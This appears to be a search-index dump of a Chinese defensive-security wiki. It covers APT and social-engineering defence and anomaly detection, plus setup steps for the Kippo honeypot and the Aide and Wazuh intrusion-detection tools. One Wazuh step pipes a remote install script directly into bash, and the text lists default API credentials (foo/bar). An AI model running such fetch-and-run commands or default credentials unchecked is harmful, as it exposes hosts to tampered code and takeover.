APT\u653b\u51fb\u7684\u9632\u8303\u7b56\u7565"},{"location":"data_security/big_data_security_copy/#050501","text":"\u6728\u9a6c\u5165\u4fb5\u3001\u793e\u4f1a\u5de5\u7a0b\u662fAPT\u653b\u51fb\u7684\u7b2c\u4e00\u4e2a\u6b65\u9aa4\uff0c\u9632\u8303\u793e\u4f1a\u5de5\u7a0b\u9700\u8981\u4e00\u5957\u7efc\u5408\u6027\u63aa\u65bd\uff0c\u65e2\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\uff0c\u5b8c\u5584\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7b56\u7565\uff0c\u5982\uff1a\u7981\u6b62\u5458\u5de5\u5728\u4e2a\u4eba\u5fae\u535a\u4e0a\u516c\u5e03\u4e8e\u5de5\u4f5c\u76f8\u5173\u4fe1\u606f\uff0c\u7981\u6b62\u5728\u793e\u4ea4\u7f51\u7ad9\u4e0a\u516c\u5e03\u79c1\u4eba\u8eab\u4efd\u548c\u8054\u7edc\u4fe1\u606f\u7b49\uff1b\u53c8\u8981\u91c7\u7528\u65b0\u578b\u7684\u68c0\u6d4b\u6280\u672f\uff0c\u63d0\u9ad8\u8bc6\u522b\u6076\u610f\u7a0b\u5e8f\u7684\u51c6\u786e\u6027\u3002\u793e\u4f1a\u5de5\u7a0b\u662f\u5229\u7528\u4eba\u6027\u7684\u5f31\u70b9\u9488\u5bf9\u4eba\u5458\u8fdb\u884c\u7684\u6e17\u900f\u8fc7\u7a0b\u3002\u56e0\u6b64\u63d0\u9ad8\u4eba\u5458\u7684\u4fe1\u606f\u5b89\u5168\u610f\u8bc6\uff0c\u662f\u9632\u6b62\u793e\u4f1a\u653b\u51fb\u7684\u6700\u57fa\u672c\u7684\u65b9\u6cd5\u3002\u4f20\u7edf\u7684\u529e\u6cd5\u662f\u901a\u8fc7\u5ba3\u8bb2\u57f9\u8bad\u7684\u65b9\u5f0f\u6765\u63d0\u9ad8\u5b89\u5168\u610f\u8bc6\uff0c\u4f46\u662f\u5f80\u5f80\u6548\u679c\u4e0d\u597d\uff0c\u4e0d\u5bb9\u6613\u5bf9\u542c\u4f17\u4ea7\u751f\u89e6\u52a8\uff1b\u800c\u6bd4\u8f83\u597d\u7684\u65b9\u6cd5\u662f\u793e\u4f1a\u5de5\u7a0b\u6d4b\u8bd5\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5df2\u7ecf\u662f\u88ab\u4e1a\u754c\u666e\u904d\u63a5\u53d7\u7684\u65b9\u5f0f\uff0c\u6709\u4e9b\u5927\u578b\u4f01\u4e1a\u90fd\u4f1a\u6388\u6743\u4e13\u4e1a\u516c\u53f8\u5b9a\u671f\u5728\u5185\u90e8\u8fdb\u884c\u6d4b\u8bd5\u3002 \u7edd\u5927\u90e8\u5206\u793e\u5de5\u653b\u51fb\u662f\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u6216\u5373\u65f6\u6d88\u606f\u8fdb\u884c\u7684\u3002\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u8bbe\u5907\u5e94\u8be5\u505a\u5230\u963b\u6b62\u5185\u90e8\u4e3b\u673a\u5bf9\u6076\u610fURL\u7684\u8bbf\u95ee\u3002\u5783\u573e\u90ae\u4ef6\u7684\u5f7b\u5e95\u68c0\u67e5\uff0c\u5bf9\u53ef\u7591\u90ae\u4ef6\u4e2dURL\u94fe\u63a5\u548c\u9644\u4ef6\u5e94\u8be5\u505a\u5230\u7ec6\u81f4\u8ba4\u771f\u7684\u68c0\u6d4b\u3002\u6709\u4e9b\u9644\u4ef6\u8868\u9762\u4e0a\u770b\u8d77\u6765\u5c31\u662f\u4e00\u4e2a\u666e\u901a\u7684\u6570\u636e\u6587\u4ef6\uff0c\u5982PDF\u6216Excel\u683c\u5f0f\u7684\u6587\u6863\u7b49\uff0c\u6076\u610f\u7a0b\u5e8f\u5d4c\u5165\u5728\u6587\u4ef6\u4e2d\uff0c\u4e14\u5229\u7528\u7684\u6f0f\u6d1e\u90fd\u662f\u672a\u7ecf\u516c\u5f00\u7684\u3002\u901a\u5e38\u4ec5\u901a\u8fc7\u7279\u5f81\u626b\u63cf\u7684\u65b9\u5f0f\uff0c\u5f80\u5f80\u4e0d\u80fd\u51c6\u786e\u8bc6\u522b\u51fa\u6765\u7684\u3002\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\u662f\u6c99\u7bb1\u6a21\u62df\u771f\u5b9e\u73af\u5883\u8bbf\u95ee\u90ae\u4ef6\u4e2d\u7684URL\u6216\u6253\u5f00\u9644\u4ef6\uff0c\u89c2\u5bdf\u6c99\u7bb1\u4e3b\u673a\u7684\u884c\u4e3a\u53d8\u5316\uff0c\u53ef\u4ee5\u6709\u6548\u68c0\u6d4b\u51fa\u6076\u610f\u7a0b\u5e8f\u3002","title":"05.05.01 \u9632\u793e\u4f1a\u5de5\u7a0b"},{"location":"data_security/big_data_security_copy/#050502","text":"\u5bf9IT\u7cfb\u7edf\u884c\u4e3a\u8bb0\u5f55\u7684\u6536\u96c6\u662f\u5f02\u5e38\u884c\u4e3a\u68c0\u6d4b\u7684\u57fa\u7840\u548c\u524d\u63d0\uff0c\u5927\u90e8\u5206IT\u7cfb\u7edf\u884c\u4e3a\u53ef\u4ee5\u5206\u4e3a\u4e3b\u673a\u884c\u4e3a\u548c\u7f51\u7edc\u884c\u4e3a\u4e24\u4e2a\u65b9\u9762\uff0c\u66f4\u5168\u9762\u7684\u884c\u4e3a\u91c7\u96c6\u8fd8\u5305\u62ec\u7269\u7406\u8bbf\u95ee\u884c\u4e3a\u8bb0\u5f55\u91c7\u96c6\u3002 \u4e3b\u673a\u884c\u4e3a\u91c7\u96c6\uff1a\u4e3b\u673a\u884c\u4e3a\u91c7\u96c6\u4e00\u822c\u662f\u901a\u8fc7\u5141\u8bb8\u5728\u4e3b\u673a\u4e0a\u7684\u884c\u4e3a\u76d1\u63a7\u7a0b\u5e8f\u5b8c\u6210\u3002\u6709\u4e9b\u884c\u4e3a\u8bb0\u5f55\u53ef\u4ee5\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u81ea\u5e26\u7684\u65e5\u5fd7\u529f\u80fd\u5b9e\u73b0\u8f93\u51fa\u3002\u4e3a\u4e86\u5b9e\u73b0\u5bf9\u8fdb\u7a0b\u884c\u4e3a\u7684\u76d1\u63a7\uff0c\u884c\u4e3a\u76d1\u63a7\u7a0b\u5e8f\u901a\u5e38\u5de5\u4f5c\u5728\u64cd\u4f5c\u7cfb\u7edf\u7684\u9a71\u52a8\u5c42\uff0c\u5982\u679c\u5728\u5b9e\u73b0\u4e0a\u6709\u9519\u8bef\uff0c\u5f88\u5bb9\u6613\u5f15\u8d77\u5e95\u5c42\u5d29\u6e83\u3002\u4e3a\u4e86\u907f\u514d\u88ab\u6076\u610f\u7a0b\u5e8f\u63a2\u6d4b\u5230\u76d1\u63a7\u7a0b\u5e8f\u7684\u5b58\u5728\uff0c\u884c\u4e3a\u76d1\u63a7\u7a0b\u5e8f\u5e94\u5c3d\u91cf\u5de5\u4f5c\u5728\u9a71\u52a8\u5c42\u7684\u5e95\u90e8\uff0c\u4f46\u662f\u8d8a\u9760\u8fd1\u5e95\u90e8\uff0c\u7a33\u5b9a\u6027\u98ce\u9669\u5c31\u8d8a\u9ad8\u3002 \u7f51\u7edc\u884c\u4e3a\u91c7\u96c6\uff1a\u7f51\u7edc\u884c\u4e3a\u91c7\u96c6\u4e00\u822c\u662f\u901a\u8fc7\u955c\u50cf\u7f51\u7edc\u6d41\u91cf\uff0c\u5c06\u6d41\u91cf\u6570\u636e\u8f6c\u6362\u6210\u6d41\u91cf\u65e5\u5fd7\u3002\u4ee5Netflow\u8bb0\u5f55\u4e3a\u4ee3\u8868\u7684\u65e9\u671f\u6d41\u91cf\u65e5\u5fd7\u53ea\u5305\u542b\u7f51\u7edc\u5c42\u7684\u4fe1\u606f\u3002\u8fd1\u5e74\u6765\u7684\u5f02\u5e38\u884c\u4e3a\u5927\u90fd\u51e0\u79cd\u5728\u5e94\u7528\u5c42\uff0c\u4ec5\u51ed\u7f51\u7edc\u5c42\u7684\u4fe1\u606f\u96be\u4ee5\u5206\u6790\u51fa\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002\u5e94\u7528\u5c42\u6d41\u91cf\u65e5\u5fd7\u7684\u8f93\u51fa\uff0c\u5173\u952e\u5728\u4e8e\u5e94\u7528\u7684\u5206\u7c7b\u548c\u5efa\u6a21\u3002","title":"05.05.02 \u5168\u9762\u91c7\u96c6\u884c\u4e3a\u8bb0\u5f55\uff0c\u907f\u514d\u5185\u90e8\u76d1\u63a7\u76f2\u70b9"},{"location":"data_security/big_data_security_copy/#050503-it","text":"\u4ece\u524d\u8ff0APT\u653b\u51fb\u8fc7\u7a0b\u53ef\u4ee5\u770b\u51fa\uff0c\u5f02\u5e38\u884c\u4e3a\u5305\u62ec\u5bf9\u5185\u90e8\u7f51\u7edc\u7684\u626b\u63cf\u63a2\u6d4b\u3001\u5185\u90e8\u7684\u975e\u6388\u6743\u8bbf\u95ee\u3001\u975e\u6cd5\u5916\u8054\u3002\u975e\u6cd5\u5916\u8054\uff0c\u5373\u76ee\u6807\u4e3b\u673a\u4e0e\u5916\u7f51\u7684\u901a\u4fe1\u884c\u4e3a\uff0c\u53ef\u5206\u4e3a\u4ee5\u4e0b3\u7c7b\uff1a \u4e0b\u8f7d\u6076\u610f\u7a0b\u5e8f\u5230\u76ee\u6807\u4e3b\u673a\uff0c\u8fd9\u4e9b\u4e0b\u8f7d\u884c\u4e3a\u4e0d\u4ec5\u5728\u611f\u67d3\u521d\u671f\u53d1\u751f\uff0c\u5728\u540e\u7eed\u6076\u610f\u7a0b\u5e8f\u5347\u7ea7\u65f6\u8fd8\u4f1a\u51fa\u73b0\u3002 \u76ee\u6807\u4e3b\u673a\u4e0e\u5916\u7f51\u7684C C\u670d\u52a1\u5668\u8fdb\u884c\u8054\u7edc\u3002 \u5185\u90e8\u4e3b\u673a\u5411C C\u670d\u52a1\u5668\u4f20\u9001\u6570\u636e\uff0c\u5176\u4e2d\u5916\u4f20\u6570\u636e\u7684\u884c\u4e3a\u662f\u6700\u591a\u6837\u3001\u6700\u9690\u853d\u4e5f\u662f\u6700\u7ec8\u5b9e\u8d28\u6027\u5371\u5bb3\u7684\u884c\u4e3a\u3002 \uff08\u8fdc\u7a0b\u547d\u4ee4\u548c\u63a7\u5236\u670d\u52a1\u5668\uff0c\u76ee\u6807\u673a\u5668\u53ef\u4ee5\u63a5\u6536\u6765\u81ea\u670d\u52a1\u5668\u7684\u547d\u4ee4\uff0c\u4ece\u800c\u8fbe\u5230\u670d\u52a1\u5668\u63a7\u5236\u76ee\u6807\u673a\u5668\u7684\u76ee\u7684\u3002\u8be5\u65b9\u6cd5\u5e38\u7528\u4e8e\u75c5\u6bd2\u6728\u9a6c\u63a7\u5236\u88ab\u611f\u67d3\u7684\u673a\u5668\u3002\uff09","title":"05.05.03 IT\u7cfb\u7edf\u5f02\u5e38\u884c\u4e3a\u68c0\u6d4b"},{"location":"honeypot/kippo/","text":"Kippo SSH\u871c\u7f50 kippo Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eKippo # \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 yum install epel-release -y yum install python2-pip.noarch python-devel.x86_64 gcc.x86_64 -y pip install Twisted # \u8fd9\u91cc\u6709\u5751 pip install pycrypto pip install zope.interface pip install cryptography pip install pyasn1 \u6267\u884cstart.sh\u4f1a\u62a5\u9519\u5982\u4e0b\uff1a No module named kippo.core.config \u89e3\u51b3\u65b9\u6848\uff1a pip install twisted==15.2.0 \u5b89\u88c5Kippo # \u6267\u884cstart.sh\uff0c\u4e0d\u80fd\u4ee5root\u7528\u6237\u6267\u884c useradd kippo su kippo # \u4e0b\u8f7d cd ~ git clone https://github.com/desaster/kippo.git cd ~/kippo cp kippo.cfg.dist kippo.cfg ./start.sh # \u542f\u52a8\u6210\u529f\u540e\u4f1a\u5f00\u542f\u4e00\u4e2a2222\u7aef\u53e3 # \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u6765\u8fde\u63a5\u8be5\u7aef\u53e3\uff0c\u5e76\u76d1\u542c\u65e5\u5fd7 ssh root@localhost -p2222 tail -f ~/kippo/log/kippo.log \u9ad8\u7ea7\u4f7f\u7528 \u5c06Kippo\u7684\u7aef\u53e3\u8f6c\u53d1\u523022\u7aef\u53e3\u4e0a iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222 # \u6b64\u65f6\u6211\u4eec\u6765\u8fde\u63a522\u7aef\u53e3\u5c1d\u8bd5\u4e00\u4e0b ssh root@localhost","title":"Kippo SSH\u871c\u7f50"},{"location":"honeypot/kippo/#kippo-ssh","text":"kippo","title":"Kippo SSH\u871c\u7f50"},{"location":"honeypot/kippo/#centos7kippo","text":"# \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 yum install epel-release -y yum install python2-pip.noarch python-devel.x86_64 gcc.x86_64 -y pip install Twisted # \u8fd9\u91cc\u6709\u5751 pip install pycrypto pip install zope.interface pip install cryptography pip install pyasn1 \u6267\u884cstart.sh\u4f1a\u62a5\u9519\u5982\u4e0b\uff1a No module named kippo.core.config \u89e3\u51b3\u65b9\u6848\uff1a pip install twisted==15.2.0 \u5b89\u88c5Kippo # \u6267\u884cstart.sh\uff0c\u4e0d\u80fd\u4ee5root\u7528\u6237\u6267\u884c useradd kippo su kippo # \u4e0b\u8f7d cd ~ git clone https://github.com/desaster/kippo.git cd ~/kippo cp kippo.cfg.dist kippo.cfg ./start.sh # \u542f\u52a8\u6210\u529f\u540e\u4f1a\u5f00\u542f\u4e00\u4e2a2222\u7aef\u53e3 # \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u6765\u8fde\u63a5\u8be5\u7aef\u53e3\uff0c\u5e76\u76d1\u542c\u65e5\u5fd7 ssh root@localhost -p2222 tail -f ~/kippo/log/kippo.log","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eKippo"},{"location":"honeypot/kippo/#_1","text":"","title":"\u9ad8\u7ea7\u4f7f\u7528"},{"location":"honeypot/kippo/#kippo22","text":"iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222 # \u6b64\u65f6\u6211\u4eec\u6765\u8fde\u63a522\u7aef\u53e3\u5c1d\u8bd5\u4e00\u4e0b ssh root@localhost","title":"\u5c06Kippo\u7684\u7aef\u53e3\u8f6c\u53d1\u523022\u7aef\u53e3\u4e0a"},{"location":"ids_ips/aide/","text":"Aide\u57fa\u4e8e\u6587\u4ef6\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf Aide\uff1aadvance intrusion detection environment \u9ad8\u7ea7\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf \u5b98\u7f51\u5730\u5740 Centos7\u5b89\u88c5\u4e0e\u914d\u7f6e # yum\u76f4\u63a5\u5b89\u88c5aide yum install aide.x86_64 -y \u914d\u7f6eAide vim /etc/aide.conf # \u89c4\u5219\u8bf4\u660e p: \u6743\u9650 i: \u7d22\u5f15\u8282\u70b9 n: \u94fe\u63a5\u6570 u: \u7528\u6237 g: \u7528\u6237\u7ec4 s: \u5927\u5c0f m: \u4fee\u6539\u65f6\u95f4 c: \u521b\u5efa\u65f6\u95f4 acl: \u8bbf\u95ee\u63a7\u5236\u5217\u8868 selinux: SELinux xattrs: xattr\u6743\u9650 sha256/sha512: SHA256\u6216SHA512 # \u6761\u76ee\u4e4b\u524d\u7684!\u4ee3\u8868\u5ffd\u7565\u5b50\u76ee\u5f55\u6216\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002 \u5e38\u89c1\u4fdd\u62a4\u89c4\u5219 FIPSR: ALLXTRAHASHES: EVERYTHING: NORMAL: DIR: PERMS: STATIC: LOG: CONTENT: CONTENT_EX: DATAONLY \u4f7f\u7528Aide # \u521d\u59cb\u5316\u6570\u636e\u5e93 aide -i # \u5c06\u521d\u59cb\u5316\u6570\u636e\u5e93\u91cd\u547d\u540d\uff0c\u6570\u636e\u5e93\u4e2d\u8bb0\u5f55\u7684\u4fe1\u606f\u4ee5\u521d\u59cb\u5316\u6570\u636e\u5e93\u65f6\u7cfb\u7edf\u4fe1\u606f\u4e3a\u51c6\uff0c\u5982\u679c\u7cfb\u7edf\u53d1\u751f\u6b63\u5e38\u53d8\u5316\uff0c\u53ef\u4ee5\u4ece\u65b0\u8fdb\u884c\u521d\u59cb\u5316\u3002 mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz # \u6267\u884c\u68c0\u67e5 aide -C # \u66f4\u65b0\u6570\u636e\u5e93 aide -u mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz # \u68c0\u67e5\u914d\u7f6e\u6587\u4ef6\u662f\u5426\u6b63\u786e aide -D \u53c2\u8003\u8d44\u6599 \u5728CentOS\u4e0a\u914d\u7f6e\u57fa\u4e8e\u4e3b\u673a\u7684\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08IDS\uff09","title":"Aide\u57fa\u4e8e\u6587\u4ef6\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf"},{"location":"ids_ips/aide/#aide","text":"Aide\uff1aadvance intrusion detection environment \u9ad8\u7ea7\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf \u5b98\u7f51\u5730\u5740","title":"Aide\u57fa\u4e8e\u6587\u4ef6\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf"},{"location":"ids_ips/aide/#centos7","text":"# yum\u76f4\u63a5\u5b89\u88c5aide yum install aide.x86_64 -y","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6e"},{"location":"ids_ips/aide/#aide_1","text":"vim /etc/aide.conf # \u89c4\u5219\u8bf4\u660e p: \u6743\u9650 i: \u7d22\u5f15\u8282\u70b9 n: \u94fe\u63a5\u6570 u: \u7528\u6237 g: \u7528\u6237\u7ec4 s: \u5927\u5c0f m: \u4fee\u6539\u65f6\u95f4 c: \u521b\u5efa\u65f6\u95f4 acl: \u8bbf\u95ee\u63a7\u5236\u5217\u8868 selinux: SELinux xattrs: xattr\u6743\u9650 sha256/sha512: SHA256\u6216SHA512 # \u6761\u76ee\u4e4b\u524d\u7684!\u4ee3\u8868\u5ffd\u7565\u5b50\u76ee\u5f55\u6216\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002","title":"\u914d\u7f6eAide"},{"location":"ids_ips/aide/#_1","text":"FIPSR: ALLXTRAHASHES: EVERYTHING: NORMAL: DIR: PERMS: STATIC: LOG: CONTENT: CONTENT_EX: DATAONLY","title":"\u5e38\u89c1\u4fdd\u62a4\u89c4\u5219"},{"location":"ids_ips/aide/#aide_2","text":"# \u521d\u59cb\u5316\u6570\u636e\u5e93 aide -i # \u5c06\u521d\u59cb\u5316\u6570\u636e\u5e93\u91cd\u547d\u540d\uff0c\u6570\u636e\u5e93\u4e2d\u8bb0\u5f55\u7684\u4fe1\u606f\u4ee5\u521d\u59cb\u5316\u6570\u636e\u5e93\u65f6\u7cfb\u7edf\u4fe1\u606f\u4e3a\u51c6\uff0c\u5982\u679c\u7cfb\u7edf\u53d1\u751f\u6b63\u5e38\u53d8\u5316\uff0c\u53ef\u4ee5\u4ece\u65b0\u8fdb\u884c\u521d\u59cb\u5316\u3002 mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz # \u6267\u884c\u68c0\u67e5 aide -C # \u66f4\u65b0\u6570\u636e\u5e93 aide -u mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz # \u68c0\u67e5\u914d\u7f6e\u6587\u4ef6\u662f\u5426\u6b63\u786e aide -D","title":"\u4f7f\u7528Aide"},{"location":"ids_ips/aide/#_2","text":"\u5728CentOS\u4e0a\u914d\u7f6e\u57fa\u4e8e\u4e3b\u673a\u7684\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08IDS\uff09","title":"\u53c2\u8003\u8d44\u6599"},{"location":"ids_ips/wazuh/","text":"Wazuh\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eWazuh Wazuh\u4e0b\u8f7d\u5730\u5740 Wazuh Manager\u5b89\u88c5 # Server IP\uff1a10.10.10.24 # \u5b89\u88c5manager rpm -ivh wazuh-manager-3.9.2-1.x86_64.rpm # \u5b89\u88c5\u5b8c\u6210\u540e\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5f00\u673a\u81ea\u542f\u5e76\u4e14\u5df2\u7ecf\u542f\u52a8\u8be5\u670d\u52a1 systemctl status wazuh-manager.service Wazuh API\u5b89\u88c5 # Server IP\uff1a10.10.10.24 # \u5b89\u88c5nodejs10 curl -sL https://rpm.nodesource.com/setup_10.x | bash - yum install nodejs.x86_64 nodejs-devel.x86_64 -y # \u5b89\u88c5wazuh api rpm -ivh wazuh-api-3.9.2-1.x86_64.rpm # \u5b89\u88c5\u5b8c\u6210\u540e\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5f00\u673a\u81ea\u542f\u5e76\u4e14\u5df2\u7ecf\u542f\u52a8\u8be5\u670d\u52a1 systemctl status wazuh-api.service \u914d\u7f6eWazuh API\u7528\u6237 # \u914d\u7f6e\u7aef\u53e3\u8d26\u6237\u7b49\u4fe1\u606f cd /var/ossec/api/scripts ./configure_api.sh # \u67e5\u770b\u7528\u6237\u4fe1\u606f cat /var/ossec/api/configuration/auth/user ELK+Filebeat\u5b89\u88c5 Kibana\u5b89\u88c5Wazuh\u63d2\u4ef6 \u5b98\u7f51\u5730\u5740 # \u8fd9\u91cc\u662f\u4f7f\u7528\u7684root\uff0c\u771f\u5b9e\u73af\u5883\u6700\u597d\u4e0d\u7528\uff0c\u622a\u6b622019\u5e7406\u670828\u65e5\uff0cwazuh\u8fd8\u4e0d\u652f\u6301kibana7.2\u6240\u4ee5\uff0c\u6211\u4eec\u8981\u4f7f\u7528kibana7.1 /usr/share/kibana/bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp-3.9.2_7.1.1.zip # \u91cd\u542fkibana\uff0c\u91cd\u542f\u4f1a\u82b1\u8d39\u8f83\u957f\u7684\u65f6\u95f4 systemctl restart kibana.service Kibana Wazuh\u63d2\u4ef6\u914d\u7f6eWazuh API\u8d26\u53f7\u5bc6\u7801 \u9ed8\u8ba4\u7684\u8d26\u53f7\u5bc6\u7801\u662f\uff1afoo/bar\uff0cip\u5730\u5740\u5c31\u662f\u4f60\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c\u7aef\u53e3\u662f55000\u3002 \u5b98\u65b9\u94fe\u63a5 \u6b64\u65f6\uff0c\u5728Kibana\u7684Wazuh\u63d2\u4ef6\u662f\u6ca1\u6709\u6570\u636e\u7684\uff0c\u56e0\u4e3a\u8fd8\u6ca1\u6709\u914d\u7f6e\u65e5\u5fd7\u89e3\u6790\u3002 \u914d\u7f6e\u91c7\u96c6\u65e5\u5fd7\u6a21\u7248 \u4e0b\u8f7d\u6a21\u7248\u6587\u4ef6 # \u4e0b\u8f7dfilebeat\u914d\u7f6e\u6587\u4ef6 curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/filebeat/7.x/filebeat.yml chmod go+r /etc/filebeat/filebeat.yml # \u4e0b\u8f7delasticsearch\u7684\u6a21\u7248\u6587\u4ef6 curl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/elasticsearch/7.x/wazuh-template.json chmod go+r /etc/filebeat/wazuh-template.json \u914d\u7f6eFilebeat output.elasticsearch: hosts: ['http://YOUR_ELASTIC_SERVER_IP:9200'] # \u4fee\u6539\u4e3a output.elasticsearch: hosts: ['http://10.10.10.24:9200'] \u914d\u7f6e\u5b8c\u6210\u4ee5\u540e\uff0c\u91cd\u542f\u670d\u52a1\uff0c\u5c31\u53ef\u4ee5\u5728Kibana Wazuh\u63d2\u4ef6\u4e2d\u770b\u5230\u6570\u636e\u4e86\u3002 wazuh client\u5b89\u88c5\u4e0e\u914d\u7f6e # Client IP\uff1a10.10.10.25 # \u5b89\u88c5agent rpm -ivh wazuh-agent-3.9.2-1.x86_64.rpm # \u6b64\u65f6wazuh-agent\u7684\u670d\u52a1\u662f\u542f\u52a8\u5931\u8d25\u7684\uff0c\u56e0\u4e3a\u6ca1\u6709\u8ba4\u8bc1\u6587\u4ef6 \u9996\u5148\u5728\u670d\u52a1\u7aef\u751f\u6210\u5bc6\u94a5\uff1a \u5ba2\u6237\u7aef\u5bfc\u5165\u6587\u4ef6 \u5ba2\u6237\u7aef\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff1avim /var/ossec/etc/ossec.conf # \u914d\u7f6e\u670d\u52a1\u7aefIP\u5730\u5740\u4e0e\u7aef\u53e3 server address 10.10.10.24 /address port 1514 /port protocol udp /protocol /server \u91cd\u542fwazuh-agent\uff0c\u5728Kibana\u4e0a\u67e5\u770b\u6570\u636e /var/ossec/bin/ossec-control restart \u5ba2\u6237\u7aef\u81ea\u52a8\u5316\u90e8\u7f72 \u4e3b\u8981\u662f\u4e3a\u4e86\u5728\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\u5c31\u505a\u597d\u5ba2\u6237\u7aef\u5b89\u88c5\u3002 \u5b98\u7f51\u5730\u5740 \u5b98\u65b9\u811a\u672c\u5b9e\u73b0 \u5728\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\u628awazuh\u7684\u811a\u672c\u4e32\u5230\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u811a\u672c\u4e2d\u3002 # \u5728\u5f00\u5934\u6dfb\u52a0\u5982\u4e0b\u4fe1\u606f # \u5b89\u88c5\u5ba2\u6237\u7aef rpm -qa|grep wazuh-agent-3.9.3-1.x86_64 if [ $? -eq 0 ];then echo file exists exit fi wget https://packages.wazuh.com/3.x/yum/wazuh-agent-3.9.3-1.x86_64.rpm rpm -ivh wazuh-agent-3.9.3-1.x86_64.rpm sed -i '10c address server_ip /address ' /var/ossec/etc/ossec.conf wazuh\u89c4\u5219\u5b66\u4e60 \u89c4\u5219\u6587\u4ef6\u89e3\u8bfb SSH\u76f8\u5173\u89c4\u5219\u6587\u4ef6 ls /var/ossec/ruleset/rules | grep ssh # 0095-sshd_rules.xml # sshd: Possible attack on the ssh server # sshd: insecure connection attempt (scan). \u5982\u679c\u662f\u963f\u91cc\u4e91\u7684\u4e3b\u673a\uff0c\u4f1a\u6709\u5f88\u591a\u6b64\u7c7b\u578b\u7684\u65e5\u5fd7\uff0c\u662f\u963f\u91cc\u4e91\u81ea\u5df1\u7684\u626b\u63cf ls /var/ossec/ruleset/rules | grep pam # 0085-pam_rules.xml","title":"Wazuh\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf"},{"location":"ids_ips/wazuh/#wazuh","text":"","title":"Wazuh\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf"},{"location":"ids_ips/wazuh/#centos7wazuh","text":"Wazuh\u4e0b\u8f7d\u5730\u5740","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eWazuh"},{"location":"ids_ips/wazuh/#wazuh-manager","text":"# Server IP\uff1a10.10.10.24 # \u5b89\u88c5manager rpm -ivh wazuh-manager-3.9.2-1.x86_64.rpm # \u5b89\u88c5\u5b8c\u6210\u540e\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5f00\u673a\u81ea\u542f\u5e76\u4e14\u5df2\u7ecf\u542f\u52a8\u8be5\u670d\u52a1 systemctl status wazuh-manager.service","title":"Wazuh Manager\u5b89\u88c5"},{"location":"ids_ips/wazuh/#wazuh-api","text":"# Server IP\uff1a10.10.10.24 # \u5b89\u88c5nodejs10 curl -sL https://rpm.nodesource.com/setup_10.x | bash - yum install nodejs.x86_64 nodejs-devel.x86_64 -y # \u5b89\u88c5wazuh api rpm -ivh wazuh-api-3.9.2-1.x86_64.rpm # \u5b89\u88c5\u5b8c\u6210\u540e\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5f00\u673a\u81ea\u542f\u5e76\u4e14\u5df2\u7ecf\u542f\u52a8\u8be5\u670d\u52a1 systemctl status wazuh-api.service","title":"Wazuh API\u5b89\u88c5"},{"location":"ids_ips/wazuh/#wazuh-api_1","text":"# \u914d\u7f6e\u7aef\u53e3\u8d26\u6237\u7b49\u4fe1\u606f cd /var/ossec/api/scripts ./configure_api.sh # \u67e5\u770b\u7528\u6237\u4fe1\u606f cat /var/ossec/api/configuration/auth/user","title":"\u914d\u7f6eWazuh API\u7528\u6237"},{"location":"ids_ips/wazuh/#elkfilebeat","text":"","title":"ELK+Filebeat\u5b89\u88c5"},{"location":"ids_ips/wazuh/#kibanawazuh","text":"\u5b98\u7f51\u5730\u5740 # \u8fd9\u91cc\u662f\u4f7f\u7528\u7684root\uff0c\u771f\u5b9e\u73af\u5883\u6700\u597d\u4e0d\u7528\uff0c\u622a\u6b622019\u5e7406\u670828\u65e5\uff0cwazuh\u8fd8\u4e0d\u652f\u6301kibana7.2\u6240\u4ee5\uff0c\u6211\u4eec\u8981\u4f7f\u7528kibana7.1 /usr/share/kibana/bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp-3.9.2_7.1.1.zip # \u91cd\u542fkibana\uff0c\u91cd\u542f\u4f1a\u82b1\u8d39\u8f83\u957f\u7684\u65f6\u95f4 systemctl restart 